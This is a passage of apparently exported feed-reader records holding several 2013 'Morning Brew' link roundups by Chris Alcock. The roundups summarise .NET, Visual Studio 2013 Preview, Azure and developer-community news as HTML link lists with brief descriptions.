Preview Release.  This release aims to improve the software engineering aspects of the language, and to make it easier to use in common situations, with improvements to array slicing, LINQ type inference, C# Extension methods and support for .NET 4.5 and Windows Store portable libraries.  The tooling also gets a number of improvements</li><li><a href=\"http://blogs.msdn.com/b/adonet/archive/2013/06/26/ef-and-visual-studio-2013-preview.aspx\">EF and Visual Studio 2013 Preview</a> - Rowan Miller highlights the inclusion of Entity Framework 6 Beta 1 in the Visual Studio 2013 Preview Release, sharing a summary of the changes and improvements made as a part of the EF6 release.</li><li><a href=\"http://blogs.msdn.com/b/webdev/archive/2013/06/27/html-editing-features-in-visual-studio-2013-preview.aspx\">HTML Editing Features in Visual Studio 2013 Preview</a> - VKichline shares details of the improvements made by way of a completely new implementation of the HTML Editor in Visual Studio 2013 Preview.  This new editor applies to both Razor and HTML editing, and aims to make extensibility easier, allowing new features to be added in update packages.  The post also notes some of the areas which have yet to be completed, and didn’t make it into the preview release.</li><li><a href=\"http://blogs.msdn.com/b/visualstudio/archive/2013/06/27/what-s-new-in-visual-studio-2013-preview-for-authoring-windows-store-xaml-apps.aspx\">What’s new in Visual Studio 2013 Preview for authoring Windows Store XAML apps</a> - The Visual Studio team highlight the improvements in the Preview Release, and the edition of Blend which ships with it which improve the experience working with XAML for creating Windows Store applications, including improved navigation via Go To Definition, substantial performance improvements, improved style and template editing and much more.</li><li><a href=\"http://blogs.msdn.com/b/lightswitch/archive/2013/06/27/announcing-lightswitch-in-visual-studio-2013-preview.aspx\">Announcing LightSwitch in Visual Studio 2013 Preview</a> - The Visual Studio LightSwitch team highlight their inclusion in the Visual Studio 2013 Preview Release, sharing details of their significant new features in the areas of project navigation and team collaboration.</li><li><a href=\"http://weblogs.asp.net/scottgu/archive/2013/06/27/windows-azure-general-availability-release-of-web-sites-mobile-services-new-autoscale-alerts-support-no-credit-card-needed-for-msdn-subscribers.aspx\">Windows Azure: General Availability of Web Sites + Mobile Services, New AutoScale + Alerts Support, No Credit Card Needed for MSDN</a> & <a href=\"http://blogs.msdn.com/b/windowsazure/archive/2013/06/27/announcing-the-general-availability-of-windows-azure-mobile-services-web-sites-and-continued-service-innovation.aspx\">Announcing the General Availability of Windows Azure Mobile Services, Web Sites and continued Service innovation</a> - Scott Guthrie and the official Azure Blog share in a number of announcements, including the General Availability of Azure Websites and Mobile Serivces with SLA, new Auto Scaling features which allows Azure to monitor key metrics (initially CPU and Storage Queue Depth) and apply more or less resources as required, new monitoring metrics and the ability to get alerts by email, and finally no requirement for a credit card to enable the MSDN Azure benefits.</li><li><a href=\"http://blogs.msdn.com/b/vcblog/archive/2013/06/27/what-s-new-for-visual-c-developers-in-vs2013-preview.aspx\">What’s New for Visual C++ Developers in VS2013 Preview</a> - Eric Battalio pulls together the details of all the new features for C++ Developers which are included in the preview release of Visual Studio 2013</li><li><a href=\"http://blogs.msdn.com/b/vcblog/archive/2013/06/27/using-the-2013-cpu-sampling-profiler-to-understand-c-compiler-optimizations.aspx\">Using the 2013 CPU Sampling Profiler to Understand C++ Compiler Optimizations</a> - Andrew B Hall takes a look at the improved profiling capabilities for C++ applications in Visual Studio 2013 Preview, and looks at how compiler optimisations can influence what you see in the profiler.</li></ul><h3>Software</h3><ul><li><a href=\"http://blogs.jetbrains.com/dotnet/2013/06/resharper-80-beta-is-available/\">ReSharper 8.0 Beta is Available</a> & <a href=\"http://blogs.jetbrains.com/dotnet/2013/06/resharper-to-support-c/\">ReSharper to Support C++</a> - The JetBrains team announce the availability of the Beta of ReSharper 8, a release which already works correctly in the newly release preview of Visual Studio 2013.  The team also announce their plans to implement ReSharper for C++ developers in future releases of ReSharper, and discussing their progress to date on implementing this.</li></ul><h3>Information</h3><ul><li><a href=\"http://odetocode.com/blogs/scott/archive/2013/06/27/ie11-preview-and-the-new-developer-tools.aspx\">IE11 Preview and the New Developer Tools</a> - K. Scott Allen takes a look at the new Internet Explorer 11 F12 Developer Tools which have been vastly overhauled in the new release, and take on a ‘Metro’ look and feel.</li><li><a href=\"http://blogs.msdn.com/b/pakistan/archive/2013/06/27/new-controls-in-windows-8-1.aspx\">New Controls in Windows 8.1</a> - Muhamad Umer highlights the new controls available to developers in Windows 8.1 Applications in the preview release</li><li><a href=\"http://visualstudiomagazine.com/articles/2013/06/26/signalr-revisisted.aspx\">SignalR Revisited</a> - Eric Vogel takes a look at the recent changes  SignalR building on his previous articles on the subject, looking at implementing his previous example application using persistent connections using the latest version of the API to illustrate the differences.</li><li><a href=\"http://gunnarpeipman.com/2013/06/new-way-of-creating-web-applications-on-visual-studio-2013/\">New way of creating web applications on Visual Studio 2013</a> - &</li><li><a href=\"http://gunnarpeipman.com/2013/06/code-information-indicators-in-visual-studio-2013/\">Code Information Indicators in Visual Studio 2013</a> - Gunnar Peipman explores the new Visual Studio Preview with a look at the new Web Project setup dialogs allowing a better choice of what aspects of the ‘One ASP.NET’ framework your project contains, and takes a look at some of the new visual aids to inform you about different aspects of your code.</li><li><a href=\"http://www.codetails.com/slolam/automate-orchestrate-azure-deployment/20130625\">Automate & Orchestrate Azure</a> - Shailesh Lolam takes a look at automating and coordinating the process of deploying to and provisioning Windows Azure services</li></ul><img src=\"http://feeds.feedburner.com/~r/ReflectivePerspective/~4/W8vy9862FJU\" height=\"1\" width=\"1\"/>","author":"Chris Alcock","_id":{"$wrap":"$oid","v":1237}}
{"k":"0000000084","o":"0000004066","v":"001"}
{"_id":1238,"_uid":1238,"_dt":1373742620968,"_s":"2e4f4b557e1313b14a4b76f955d208cc"}
{"subscription":{"$wrap":"$oid","v":56},"link":"http://feedproxy.google.com/~r/ReflectivePerspective/~3/kdBJdGkx2-M/","title":"The Morning Brew #1385","published":{"$wrap":"$date","v":1372236477000,"h":"2013-06-26T08:47:57.000Z"},"starred":false,"read":false,"content":"<h3>Software</h3><ul><li><a href=\"http://blogs.lessthandot.com/index.php/DataMgmt/DBProgramming/MSSQLServer/sql-server-2014-ctp1-available\">SQL Server 2014 CTP1 Available for download</a> - SQLDenis highlights the availability of the first CTP release of SQL Server 2014, available to download and try out, as well as available in the Azure Gallery where you can get a pre-configured Azure Virtual Machine image,</li><li><a href=\"http://www.jasonvolpe.com/sql-server-2014-ctp-publically-available-now/\">SQL Server 2014 CTP Publically Available Now!</a> - Jason Volpe highlights the SQL Server 2014 CTP release, and discusses some of the key new features included in the release.</li><li><a href=\"http://blogs.msdn.com/b/benjaminperkins/archive/2013/06/25/what-s-new-in-iis-8-5.aspx\">What’s new in IIS 8.5 - Microsoft Internet Information Services 8.5 New Features</a> - Benjamin Perkins shares a look at the new features included in IIS 8.5, available in the Windows Server 2012 R2 edition, including Event Tracing for Windows support, Improved logging, dynamic site activation, and idle worker process paging out.</li></ul><h3>Information</h3><ul><li><a href=\"http://paulstovell.com/blog/convention-based-rest-api-with-documentation\">Convention-based HTTP API on top of Nancy (with documentation!)</a> - Paul Stovell shares an update on the rebuilding of his Octopus Deploy products API with a new convention based HTTP API running on top of the NancyFX Framework.</li><li><a href=\"http://www.mindscapehq.com/blog/index.php/2013/06/20/be-a-better-developer-octopus-deploy/\">Be a better developer: Octopus Deploy</a> - The folks over at MindScape are running a series of posts looking at the software that they rely on to help build quality applications, and in this post John-Daniel Trask takes a look at their use of Octopus Deploy</li><li><a href=\"http://www.codeproject.com/Articles/611731/Working-with-Units-and-Amounts\">Working with Units and Amounts</a> - Rudi Breedenraedt discusses the importance of knowing the units your quantities are measured in, and explores how you can help track of them in code using specific types for different units, sharing code examples.</li><li><a href=\"http://lostintangent.tumblr.com/post/4202489524/c-api-design-type-inference-named-parameters-and\">C# API Design: Type Inference, Named Parameters, and Generic Delegates</a> - ‘Lost In Tangent’ takes a look at some of the more modern C# language features which allow you to build more complex yet discoverable APIs</li></ul><h3>Community</h3><ul><li><a href=\"http://blogs.msdn.com/b/jennifer/archive/2013/06/25/build-2013-and-microsoft-store-opening-in-troy-mi.aspx\">BUILD 2013 and Microsoft Store opening in Troy, MI</a> - Jennifer Marsman highlights the start of this year’s //build event today, at 9am Pacific, and shares some links to help you keep on top of the news and announcements, including the details of the live stream.</li><li><a href=\"http://blogs.msdn.com/b/ukmsdn/archive/2013/06/25/teched-europe-live-streams-25th-28th-june-via-channel9-msdn.aspx\">TechEd Europe Live Streams 25th - 28th June via Channel9 MSDN</a> - Lee Stott also highlights the TechEd Europe conference underway in Madrid.  As with the US Tech Ed there is a huge range of sessions on a vast range of topics, and there are live streams available via Channel 9</li><li><a href=\"http://www.dddmelbourne.com/\">DDD Melbourne - Sat 20th July</a> - The Developer Developer Developer series of events has spread well beyond the UK, and Saturday 20th July sees the 4th DDD Melbourne taking place.  Registration is open now.</li></ul><img src=\"http://feeds.feedburner.com/~r/ReflectivePerspective/~4/kdBJdGkx2-M\" height=\"1\" width=\"1\"/>","author":"Chris Alcock","_id":{"$wrap":"$oid","v":1238}}
{"k":"0000000084","o":"0000004512","v":"001"}
{"_id":1239,"_uid":1239,"_dt":1373742620968,"_s":"cb06e07b7a609f69945805af2e094502"}
{"subscription":{"$wrap":"$oid","v":56},"link":"http://feedproxy.google.com/~r/ReflectivePerspective/~3/tKmHPadKD4Q/","title":"The Morning Brew #1389","published":{"$wrap":"$date","v":1372752139000,"h":"2013-07-02T08:02:19.000Z"},"starred":false,"read":false,"content":"<h3>Information</h3><ul><li><a href=\"http://www.troyhunt.com/2013/07/how-to-build-and-how-not-to-build.html\">Troy Hunt: How to build (and how not to build) a secure \"remember me\" feature</a> - Troy Hunt explores the patterns and anti-patterns of implementing the simple ‘Remember Me’ login feature, looking at how your implementation can go wrong.</li><li><a href=\"http://ericlippert.com/2013/07/01/a-string-concatenation-puzzle/\">A string concatenation puzzle</a> - Eric Lippert shares a simple but potentially surprising puzzle as a part of his look at string concatenation</li><li><a href=\"http://www.johnpapa.net/glimpse-for-toastr/\">Glimpse Extension for Toastr</a> - John Papa takes a look at Glimpse and its new Heads up display as well as sharing a Glimpse integration for his Toastr notifications library.</li><li><a href=\"https://www.simple-talk.com/dotnet/.net-framework/the-overhead-of-asyncawait-in-net-4.5/\">The overhead of async/await in NET 4.5</a> - Chris Hurley explores the under the covers implementation of Async / Await and discusses how the additional work that goes on can have performance implications.</li><li><a href=\"http://odetocode.com/blogs/scott/archive/2013/07/01/on-the-coexistence-of-asp-net-mvc-and-webapi.aspx\">On The Coexistence of ASP.NET MVC and WebAPI</a> - K Scott Allen discusses the most common question about ASP.NET MVC and ASP.NET Web API - whcih should you use and when, taking a look at the particular reasons and use cases for each.</li><li><a href=\"http://www.dotnetcurry.com/magazine/dnc-magazine-issue7.aspx\">DNC Magazine for .NET Developers - July 2013 Issue</a> - DotNet Curry Magazine hits its 1 year anniversary (And 7th edition) with articles on Pex, ASP.NET MVC extensibility, Sharepoint, Azure SQL DB Reporting, and much more</li><li><a href=\"http://msdn.microsoft.com/en-gb/magazine/default.aspx\">MSDN Magazine</a> - THe July Edition of MSDN Magazine is now available online with articles exploring Roslyn, MVVM development on Windows 8, mobile views on ASP.NET MVC and BDD using SpecFlow.</li><li><a href=\"http://www.west-wind.com/weblog/posts/2013/Jul/01/Using-HTML-5-SessionState-to-save-rendered-Page-Content\">Using HTML 5 SessionState to save rendered Page Content</a> - Rick Strahl takes a look at using Client Side storage to store the rendered HTML in SPA like applications  to provide improved performance and user experience.</li><li><a href=\"http://blogs.microsoft.co.il/blogs/sasha/archive/2013/07/01/capturing-dumps-of-windows-azure-web-sites.aspx\">Capturing Dumps of Windows Azure Web Sites</a> - Sasha Goldshtein highlights a new Windows Azure feature which allows you to easily obtain memory dumps of your Azure Wesbites just by hitting an endpoint in your browser.</li><li><a href=\"http://thenextweb.com/insider/2013/07/01/ie10-passes-ie9-in-market-share-firefox-falls-back-below-20-but-chrome-manages-to-gain-the-most/\">IE10 Passes IE9, Firefox Down but Chrome Up</a> - The Next Web shares the latest batch of browser market share stats, which show encouraging results for Internet Explorer 10, with it being the most popular edition of Internet Explorer in current use.</li></ul><h3>Community</h3><ul><li><a href=\"http://www.andrewwestgarth.co.uk/blog/post/2013/07/01/DDD-North-2013-Announced-and-Session-Submission-Open.aspx\">DDD North 2013 Announced and Session Submission Open</a> - Andrew Westgarth announces the plans for DDD North 2013 which will be taking place in Sunderland on Saturday 12th October 2013.  Organisation of the conference is progressing well, and the session submissions are now open, so if you fancy speaking at the conference, get an abstract submitted.</li><li><a href=\"http://blogs.msdn.com/b/mvpawardprogram/archive/2013/07/01/congratulations-to-the-new-amp-renewed-mvps.aspx\">Congratulations to the New & Renewed MVPs!</a> - Yesterday was the one of the MVP programme’s renewal / award day, and over 1000 Microsoft community folk were awarded or re-awarded, including a number of friends of the Brew.  Congratulations to all.</li></ul><img src=\"http://feeds.feedburner.com/~r/ReflectivePerspective/~4/tKmHPadKD4Q\" height=\"1\" width=\"1\"/>","author":"Chris Alcock","_id":{"$wrap":"$oid","v":1239}}
{"k":"0000000084","o":"0000006222","v":"001"}
{"_id":1240,"_uid":1240,"_dt":1373742620968,"_s":"61aa19d7602155121d07b81c53e3c720"}
{"subscription":{"$wrap":"$oid","v":56},"link":"http://feedproxy.google.com/~r/ReflectivePerspective/~3/VTUPKFRgQ9I/","title":"The Morning Brew #1388","published":{"$wrap":"$date","v":1372668223000,"h":"2013-07-01T08:43:43.000Z"},"starred":false,"read":false,"content":"<p>Had a fantastic weekend at DDD East Anglia, enjoyed some excellent sessions, and got to trade war stories with friends old and new.  Many thanks to the organisers for the excellent job they did.</p><h3>Software</h3><ul><li><a href=\"http://blogs.msdn.com/b/typescript/archive/2013/06/28/announcing-typescript-0-9-0-1.aspx\">Announcing TypeScript 0.9.0.1</a> - The TypeScript Team follow on from their 0;9 release with a small update which addresses the highest priority user reported issues with 0.9</li><li><a href=\"http://blogs.msdn.com/b/astoriateam/archive/2013/06/28/wcf-data-services-5-6-0-alpha.aspx\">WCF Data Services 5.6.0 Alpha</a> - The WCF Data Services Team announce the release of an Alpha of the WCF Data Services 5.6, an early (and not yet feature complete) look at some of the new features including Visual Studio 2013 Support, complete Portable Class Library support for client libraries, and serverside inclusion of the URI Parser.</li><li><a href=\"http://blogs.msdn.com/b/nikolait/archive/2013/06/28/touchdevelop-v3-0-for-windows-phone-8-unified-experience-new-language-features-nfc-speech-tiles.aspx\">Announcing TouchDevelop v3.0 for Windows Phone 8: unified experience, new language features, NFC, speech and tile APIs</a> - Nikolai Tillmann announces the 3.0 release of Touch Develop for Windows Phone 8, a major update which brings feature parity with the Wweb application, and also includes Near Field Communication (NFC) support, Speech API access and improved tile features.</li><li><a href=\"http://ayende.com/blog/162658/ravendb-2-5-what-is-new-here?key=b489839b-3782-4dc9-88af-cb3608f2db65\">RavenDB 2.5: What is new here?</a> - Ayende shares the list of new features whcih are being included in RavenDB 2.5 , and links to the details of them </li><li><a href=\"http://coolthingoftheday.blogspot.co.uk/2013/06/google-net-api-go-portable-v140-google.html\">Google .Net API’s go portable… The v1.4.0 Google APIs .NET library is now a Portable Class Library (PCL) And now uses TPL and the new HttpClient lib too</a> - Greg Duncan highlights the latest update to the Google .NET Client libraries which bring with them support for their use as Portable Class Libraries, and making use of the Task Parallel Library  and new HTTP Client implementations,</li></ul><h3>Information</h3><ul><li><a href=\"http://blogs.msdn.com/b/eric_brechner/archive/2013/07/01/to-be-precise.aspx\">To be precise</a> - ‘I. M. Wright’ discusses the expectations of accuracy in estimation and delivery of software projects, and compares this to the accuracy achieved by landing a space probe on another planet, showing how the two do actually share a lot in common, but not immediate precision, just iteration and course correction.</li><li><a href=\"http://geekswithblogs.net/GruffCode/archive/2013/06/30/making-a-case-for-the-command-line.aspx\">Making a Case For The Command Line</a> - Jesse Taber discusses the importance of internal tools with applications, and discusses the idea of starting simple, and building a command line tool before moving on to creating web interfaces for the tool.</li><li><a href=\"http://www.strathweb.com/2013/06/ihttpactionresult-new-way-of-creating-responses-in-asp-net-web-api-2/\">IHttpActionResult - new way of creating responses in ASP.NET Web API 2</a> - Filip W takes a look at the newly introduced IHttpActionResult included in ASP.NET Web API 2, providing a new and easy way to return a response from an API action</li><li><a href=\"http://coolthingoftheday.blogspot.co.uk/2013/06/300-for-320-320-windows-81-app-and-code.html\">300 for 320 - 320 Windows 8.1. app and code samples, C++, C#, JavaScript, in a 300MB download… (Or get language level download or pick and choose singles)</a> - Greg Duncan highlights the huge number of samples for Windows 8(.1) development available in the 300MB samples pack</li><li><a href=\"http://www.codeproject.com/Tips/613712/LINQ-to-ASCII-Art\">LINQ to ASCII Art</a> - Hisham Abdullah Bin Ateya takes a look at converting images using LINQ, exploring the conversion to text and the wonders of ASCII Art.</li></ul><h3>Community</h3><ul><li><a href=\"http://lostechies.com/jimmybogard/2013/06/28/ndc-videos-online/\">NDC Videos online</a> - Jimmy Bogard highlights the availability of his sessions from the recent NDC conference.  All the sessions from the conference are now available online on Vimeo on the <a href=\"http://vimeo.com/ndcoslo\">NDCOslo on Vimeo</a> account,  so check them out as there is an incredible amount of good technical content there.</li><li><a href=\"http://blogs.msdn.com/b/lucian/archive/2013/06/28/talk-the-complete-async-three-talks-from-teched-europe-2013.aspx\">Talk: The Complete Async — three talks from TechEd Europe 2013</a> - Lucian Wischik shares Video, Slides, demo code and speaker notes for his three sessions on Async presented at the TechEd Europe conference last week.  The content here takes you from beginner level through to advanced topics.</li><li><a href=\"http://www.udidahan.com/2013/06/28/ask-udi-1-alternative-architectures-preaching-to-the-unconverted/\">Ask Udi 1: Alternative Architectures - Preaching to the Unconverted</a> - Udi Dahan shares the first episode of his Ask Udi series addressing the top two questions he received, discussing standard architecture, and the motivations that can be used on those less inclined towards publish subscribe and message bus architectures.</li><li><a href=\"http://blog.getglimpse.com/2013/06/30/glimpse-town-hall-3/\">Glimpse Town Hall #3 </a> - The Glimpse Team are holding their next ‘Town Hall’ meeting on Tuesday, July 2nd at 4:00 PM (UTC-5:00).  This is an opportunity to discuss a variety of aspects of the project including project roadmap and questions and answers</li></ul><img src=\"http://feeds.feedburner.com/~r/ReflectivePerspective/~4/VTUPKFRgQ9I\" height=\"1\" width=\"1\"/>","author":"Chris Alcock","_id":{"$wrap":"$oid","v":1240}}
{"k":"0000000084","o":"0000002949","v":"001"}
{"_id":1241,"_uid":1241,"_dt":1373742620968,"_s":"8580322ba26e2d64265b856d52832c17"}
{"subscription":{"$wrap":"$oid","v":56},"link":"http://feedproxy.google.com/~r/ReflectivePerspective/~3/eYWrehqh2WY/","title":"The Morning Brew #1378","published":{"$wrap":"$date","v":1371458324000,"h":"2013-06-17T08:38:44.000Z"},"starred":false,"read":false,"content":"<h3>Software</h3><ul><li><a href=\"http://weblogs.asp.net/scottgu/archive/2013/06/14/windows-azure-major-updates-for-mobile-backend-development.aspx\">Windows Azure: Major Updates for Mobile Backend Development</a> - Scott Guthrie announces the latest batch of improvements to the Windows Azure Mobile Services, including a .NET API available via NuGet, Android push notifications, free database and websites and much more</li><li><a href=\"http://blog.getglimpse.com/2013/06/16/glimpse-1-4-2-released/\">Glimpse 1.4.2 released</a> - Anthony van der Hoorn announces another minor update to address some reported issues in Glimpse 1.4, with a handful of issues addressed in the Glimpse.Core module.</li><li><a href=\"http://geekswithblogs.net/joycsharp/archive/2013/06/16/announcement-employee-info-starter-kit-v6.0asp.net-mvc-edition-is-released.aspx\">Announcement: Employee Info Starter Kit (v6.0-ASP.NET MVC Edition) is Released</a> - Ashraful Alam Joy highlights the release of the 6th version of the Employee Info Starter Kit, a fully formed application running on ASP.NET MVC4, Entity Framework 4.3 and SQL Compact, a great learning tool, and also a starting point for your own applications of this nature.</li></ul><h3>Information</h3><ul><li><a href=\"http://www.strathweb.com/2013/06/overriding-filters-in-asp-net-web-api-vnext/\">Overriding filters in ASP.NET Web API vNext</a> - Filip W takes a look at the next release of Web API and explores how you can override filters, addressing one of the things which is currently very difficult to achieve.</li><li><a href=\"http://www.nsprogrammer.com/2013/06/logging-to-disk-most-important-part-of.html#more\">Logging: The Most Important Part of Any Application</a> - NSProgrammer discusses the importance of good logging in your applications, looking the top 10 features that logging must provide to be useful</li><li><a href=\"http://blog.mayurtendulkar.com/2013/06/using-raygun-for-logging-in-windows.html\">Using Raygun for Logging in Windows Phone Applications</a> - Tendulkar takes a look at integrating the Raygun.Io logging service/framework into a Windows Phone application to help gather information about your applications issues.</li><li><a href=\"http://www.hanselman.com/blog/StopDoingInternetWrong.aspx\">Stop Doing Internet Wrong</a> - Scott Hanselman discusses a bunch of things that we as web developers are still getting wrong when developing sites, ranging from bad linking to mobile sites to not marking up checkboxes correctly.</li></ul><img src=\"http://feeds.feedburner.com/~r/ReflectivePerspective/~4/eYWrehqh2WY\" height=\"1\" width=\"1\"/>","author":"Chris Alcock","_id":{"$wrap":"$oid","v":1241}}
{"k":"0000000084","o":"0000003523","v":"001"}
{"_id":1242,"_uid":1242,"_dt":1373742620969,"_s":"1950c5c5c56563bab9be763ca97863ef"}
{"subscription":{"$wrap":"$oid","v":56},"link":"http://feedproxy.google.com/~r/ReflectivePerspective/~3/pnI_fL7sVA4/","title":"The Morning Brew #1384","published":{"$wrap":"$date","v":1372149080000,"h":"2013-06-25T08:31:20.000Z"},"starred":false,"read":false,"content":"<h3>Software</h3><ul><li><a href=\"http://blogs.msdn.com/b/ssdt/archive/2013/06/24/announcing-sql-server-data-tools-june-2013.aspx\">Announcing SQL Server Data Tools - June 2013</a> - Janet Yeilding announces the June 2013 release of the SQL Server Data Tools from the SQL Server Data Tools Team, a release which brings with it new features for comparing data as well as schema , new build actions and enhancements to the SQL Server Data-Tier Application Framework (DACFx),</li><li><a href=\"http://blogs.msdn.com/b/dotnet/archive/2013/06/24/please-welcome-immutablearray.aspx\">Please welcome ImmutableArray&lt;T&gt;</a> - Immo Landwerth announce a new addition to the immutable collections package, exploring its use, as well as discussing some of the improvements to value comparers and factory methods included in the updated package.</li><li><a href=\"http://www.jasonvolpe.com/microsoft-oracle-announce-partnership/\">Microsoft-Oracle Announce Partnership</a> - Jason Volpe highlights the news that Microsoft and Oracle have entered into a partnership to add official support for running Oracle software on Hyper-V and Windows Azure.</li></ul><h3>Information</h3><ul><li><a href=\"http://ericlippert.com/2013/06/24/string-concatenation-behind-the-scenes-part-two/?utm_source=rss&utm_medium=rss&utm_campaign=string-concatenation-behind-the-scenes-part-two\">String concatenation behind the scenes, part two</a> - Eric Lippert continues his look at the concatenation of strings in ,NET discussing in this part why the C# compiler does not convert string concatenation code to more efficient techniques for combining where the JScript.Net did</li><li><a href=\"http://haacked.com/archive/2013/06/24/platform-limitations-harm-net.aspx\">Platform Limitations Harm .NET</a> - Phil Haack discusses the complex and important issues of licensing, and specifically some of the restrictions about platform upon which some official Microsoft pacakges are licensed - very interesting reading, and something we should all care deeply about.</li><li><a href=\"http://www.daedtech.com/introduction-to-unit-testing-part-4-design-new-code-for-testability\">Introduction to Unit Testing Part 4: Design New Code For Testability</a> -  Erik Dietrich continues his series looking at unit testing with a look at the practice of writing new code to be unit testable  as a way of introducing testing practices into existing projects</li><li><a href=\"http://blogs.microsoft.co.il/blogs/sasha/archive/2013/06/23/node-js-and-windows-azure-a-love-story.aspx\">Node.js and Windows Azure: A Love Story</a> -  Sasha Goldshtein discusses how the Windows Azure platform makes a great place to work with Node.JS, looking at consuming some of the Azure services from Node.</li><li><a href=\"http://www.codeproject.com/Articles/607352/Injecting-Net-Assemblies-Into-Unmanaged-Processes\">Injecting .Net Assemblies Into Unmanaged Processes</a> - Pero Matić shares a project and looks at its use in injecting .NET code into unmanaged libraries - always interesting to know what goes on beneath the managed code</li></ul><img src=\"http://feeds.feedburner.com/~r/ReflectivePerspective/~4/pnI_fL7sVA4\" height=\"1\" width=\"1\"/>","author":"Chris Alcock","_id":{"$wrap":"$oid","v":1242}}
{"k":"0000000084","o":"0000012741","v":"001"}
{"_id":1243,"_uid":1243,"_dt":1373742620969,"_s":"2bbf79810f822e101f61f29e7f14e805"}
{"subscription":{"$wrap":"$oid","v":56},"link":"http://feedproxy.google.com/~r/ReflectivePerspective/~3/-HQNJ9eaYDk/","title":"The Morning Brew #1386","published":{"$wrap":"$date","v":1372324939000,"h":"2013-06-27T09:22:19.000Z"},"starred":false,"read":false,"content":"<p>Today’s edition is a bit of a beast, with lots of interesting stuff coming from the opening day of  //build.</p><p>In other news, lots of you read The Morning Brew using Google Reader (and associated 3rd Party apps).  As many of you will know, Google Reader <a href=\"https://support.google.com/reader/answer/3028851\">is being shutdown on 1st July</a> so I wanted to take a moment to make sure that you are able to take The Morning Brew with you after the shutdown.  </p><p>There are plenty of options for replacements of Google Reader itself, with a nice comprehensive list at <a href=\"http://www.replacereader.com/\">ReplaceReader.com</a> - I personally have moved over to <a href=\"http://feedly.com\">Feedly</a> in the last few days.</p><p>As for keeping The Morning Brew in your reader, many of the services will extract your existing Google Reader subscriptions (assuming you migrate before it shuts down), but should you need it here are the options for getting The Morning Brew:</p><ul><li> RSS: <a href=\"http://feeds.feedburner.com/ReflectivePerspective\">http://feeds.feedburner.com/ReflectivePerspective</a></li><li>Email Subscription: <a href=\"http://feedburner.google.com/fb/a/mailverify?uri=ReflectivePerspective\">Via FeedBurner Subscriptions</a></li><li>Web: <a href=\"http://theMorningBrew.Net\">http://TheMorningBrew.NET/</a></ul><p>Service announcement over, now onto the links…</p><h3>Visual Studio 2012 Update 3, Visual Studio 2013 Preview, and .NET 4.5.1</h3><ul><li><a href=\"http://blogs.msdn.com/b/dotnet/archive/2013/06/26/announcing-the-net-framework-4-5-1-preview.aspx\">Announcing the .NET Framework 4.5.1 Preview</a> - The .NET Team announce the release of the .NET Framework 4.5.1 Preview release.  This is the next step in the frameworks evolution, and despite the 0.0.1 version number increase there is plenty of good stuff in there including edit and continue support for x64, improved debugging capabilities, improved ADO.Net connection resilience, further capabilities for Windows 8 Store application development, JIT and Garbage collection improvements, and an increasing use of NuGet to help modularise the framework.</li><li><a href=\"http://blogs.msdn.com/b/mariohewardt/archive/2013/06/26/no-more-memory-fragmentation-on-the-large-object-heap.aspx\">No More Memory Fragmentation on the .NET Large Object Heap</a> - Mario Hewardt highlights the improvements to the .NET Large Object Heap in .NET 4.5.1 which should significantly reduce the risk of memory fragmentation</li><li><a href=\"http://blogs.msdn.com/b/bharry/archive/2013/06/26/visual-studio-2012-3-is-released.aspx\">Visual Studio 2012.3 is released</a> - Brian Harry announces the RTM release of Visual Studio 2012 Update 3 (also known as 2012.3).  This is an RTM release, and can be used in production now, and includes bugfixes and a few features for Visual Studio and Team Foundation Server, as well as improving compatibility with Visual Studio 2013.</li><li><a href=\"http://www.kunal-chowdhury.com/2013/06/download-vs2012-update-3-rtm.html\">Visual Studio 2012 Update 3 (RTM) now available for download</a> - Kunal Chowdhury also highlights the Visual Studio 2012.3 Update RTM, sharing links to the download for the update, and also the original product links.</li><li><a href=\"http://blogs.msdn.com/b/somasegar/archive/2013/06/26/visual-studio-2013-preview.aspx\">Build 2013 and Visual Studio 2013 Preview</a> - Somasegar announces the Preview Release of Visual Studio 2013, and the .NET Framework 4.5.1, and also the Visual Studio 2012.3 Update RTM.  This post gives a nice overview of the new features across the stack, and includes links off to more information from the specialist teams on a number of the items.</li><li><a href=\"http://blogs.msdn.com/b/visualstudio/archive/2013/06/26/visual-studio-2013-preview-available-now.aspx\">Visual Studio 2013 Preview Available Now!</a> - The Visual Studio Blog also announces the release, and provides links to the various ways you can give feedback about the new release.</li><li><a href=\"http://blogs.msdn.com/b/bharry/archive/2013/06/26/visual-studio-2013-preview-is-available.aspx\">Visual Studio 2013 Preview is available</a> & <a href=\"http://blogs.msdn.com/b/bharry/archive/2013/06/26/a-few-more-visual-studio-2013-preview-features.aspx\">A few more Visual Studio 2013 Preview features</a> - Brian Harry highlights the Visual Studio 2013 Preview release, and takes a look at a couple of the new features, including cloud testing support and the ‘Connected IDE’  feature which allows your settings to roam with you.</li><li><a href=\"http://blogs.msdn.com/b/visualstudioalm/archive/2013/06/26/visual-studio-2013-preview-version-control-tfbuild.aspx\">Visual Studio 2013 Preview: Version control and Team Foundation Build</a> - Andy Lewis takes a look at the new features around Version Control and Team Foundation Build included in the Visual Studio 2013 Preview release, and shares some workarounds for known issues in the preview release.</li><li><a href=\"http://blogs.msdn.com/b/visualstudioalm/archive/2013/06/26/debugging-support-for-64-bit-edit-and-continue-in-visual-studio-2013.aspx\">Debugging support for 64-bit Edit and Continue in Visual Studio 2013</a> - YanivF highlights the new Edit and Continue support for 64 bit targeted environments, a new feature in VS2013 which will take away that very annoying message which appears whenever you are at a break point and want to edit code when running in 64 bit.</li><li><a href=\"http://blogs.msdn.com/b/webdev/archive/2013/06/26/announcing-release-of-asp-net-and-web-tools-for-visual-studio-2013-preview-and-the-refresh-update.aspx\">Announcing release of ASP.NET and Web Tools for Visual Studio 2013 Preview and the refresh update </a> - Xinyang Qiu shares a look at the new ASP.NET features included in the Visual Studio 2013 Preview, including SignalR connections between browser and IDE for debugging assistance, a new HTML Editor, improvements for the ‘One ASP.NET’ initiative making it much easier to product hybrid solutions using a mix of ASP.NET technologies, improvements for running ontop of OWIN especially for Authenitication, ASP.NET MVC 5 and Web API 2, along with SignalR 2.00-beta1 and Entity Framework 6 Beta1</li><li><a href=\"http://blogs.msdn.com/b/robertgreen/archive/2013/06/26/episode-70-of-visual-studio-toolbox-visual-studio-2013-preview.aspx\">Episode 70 of Visual Studio Toolbox: Visual Studio 2013 Preview</a> - Robert Green highlights the 70th edition of the Visual Studio Toolbox on Channel9 where he is joined by Dmitry Lyalin, and they take a 1 hour whirlwind tour of Visual Studio 2013.</li></ul><h3> Windows 8.1 Update, and other  //build related announcements</h3><ul><li><a href=\"http://windows.microsoft.com/en-gb/windows-8/preview?ocid=blprev_pr_wom\">Windows 8.1 Preview - Microsoft Windows</a> - The Windows 8.1 Preview release has been made available, and includes a number of great enhancements including the return of the start 